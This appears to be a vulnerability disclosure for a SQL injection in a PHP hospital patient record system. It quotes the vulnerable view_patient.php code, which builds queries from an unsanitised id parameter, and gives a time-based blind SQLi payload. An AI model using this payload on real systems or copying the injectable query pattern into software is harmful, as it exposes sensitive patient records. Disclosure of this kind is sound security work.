@@ -1,0 +1,76 @@
+id: 37434
+date: 03/01/2022
+title: Hospital Patient Record Management System v1.0 SQL injection Vulnerability
+author: nu11secur1ty
+cves: 
+
+## Title: Hospital Patient Record Management System v1.0 SQLi 
+## Author: nu11secur1ty
+## Vendor: https://www.sourcecodester.com/users/tips23
+## Software: https://www.sourcecodester.com/php/15116/hospitals-patient-records-management-system-php-free-source-code.html
+## Reference: https://github.com/nu11secur1ty/CVE-mitre/tree/main/2022/CVE-2022-25004
+
+## Description:
+Hospital Patient Record Management System v1.0 was discovered to contain a SQL injection vulnerability via the id parameter in /patients/view_patient.php.
+The `id` parameter from Hospital Patient Record Management System v1.0 appears to be vulnerable to SQL injection attacks. 
+The attacker can take administrator account control and also of all accounts on this system, also the malicious user can download all information about this system.
+
+Status: CRITICAL
+
+
+## Vulnerable code:
+
+```php
+<?php 
+if(isset($_GET['id'])){
+    $qry = $conn->query("SELECT * FROM `patient_list` where id = '{$_GET['id']}'");
+    if($qry->num_rows > 0){
+        $res = $qry->fetch_array();
+        foreach($res as $k => $v){
+            if(!is_numeric($k))
+                $$k = $v;
+        }
+
+        $details = $conn->query("SELECT * FROM `patient_details` where patient_id ='{$id}' ");
+        while($row = $details->fetch_assoc()){
+            ${$row['meta_field']} = $row['meta_value'];
+        }
+    }else{
+        echo "<script> alert('Unknown Patient ID.'); location.href = './?page=patients';</script>";
+    }
+}else{
+    echo "<script> alert('Patient ID is required.'); location.href = './?page=patients';</script>";
+}
+
+$doctors_arr = [];
+$doctors_qry = $conn->query("SELECT * FROM `doctor_list` where id in (SELECT doctor_id FROM `patient_history` where patient_id ='{$id}') ");
+if($doctors_qry->num_rows > 0)
+$doctors_arr = array_column($doctors_qry->fetch_all(MYSQLI_ASSOC),'fullname','id');
+
+$room_arr = [];
+$room_qry = $conn->query("SELECT * FROM `room_list` where id in (SELECT room_id FROM `admission_history` where patient_id ='{$id}') ");
+if($room_qry->num_rows > 0)
+$room_arr = array_column($room_qry->fetch_all(MYSQLI_ASSOC),'name','id');
+?>
+```
+
+[+] Payloads:
+
+```mysql
+---
+Parameter: id (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 4214 FROM (SELECT(SLEEP(5)))YwrA)-- gsSe&page=patients/view_patient
+---
+
+```
+
+## Reproduce:
+[href](https://github.com/nu11secur1ty/CVE-mitre/tree/main/2022/CVE-2022-25004)
+
+## Proof and Exploit:
+[href](https://streamable.com/scki5d)
+
+
+#  0day.today [2023-03-24]  #
